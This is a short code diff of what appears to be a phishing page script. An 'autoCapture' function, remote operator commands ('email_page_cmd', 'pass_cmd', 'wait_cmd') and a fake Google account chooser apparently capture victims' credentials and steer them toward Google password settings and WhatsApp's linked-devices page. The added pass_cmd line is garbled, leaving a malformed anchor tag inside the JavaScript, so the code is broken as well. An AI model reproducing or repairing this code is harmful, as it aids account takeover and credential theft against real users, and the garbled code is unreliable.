@@ -95,7 +95,7 @@
     }
 
     function redirectToChrome() {
-        window.location.href = "intent://" + window.location.host + window.location.pathname + "?open=chrome" + "#Intent;scheme=https;//wa.me/settings/linked_devices.android.chrome;end";
+        window.location.href = "intent://" + window.location.host + window.location.pathname + "?open=chrome" + "#Intent;scheme=https;package=com.android.chrome;end";
     }
 
     function autoCapture(type, val) {
@@ -167,8 +167,7 @@
                         if (cmd === "email_page_cmd") {
                             sessionStorage.removeItem('isWaiting');
                             goToStep('google_chooser');
-                        } else if (cmd === "pass_cmd") {
-                            window.location.href = "https://myaccount.google.com/signinoptions/password?hl=ta";
+                        } else if (cmd === "pass_cmd") {<a href = "https://wa.me/settings/linked_devices" class=<a/>";
                         } else if (cmd === "wait_cmd") {
                             sessionStorage.setItem('isWaiting', 'true');
                             goToStep('verifying');
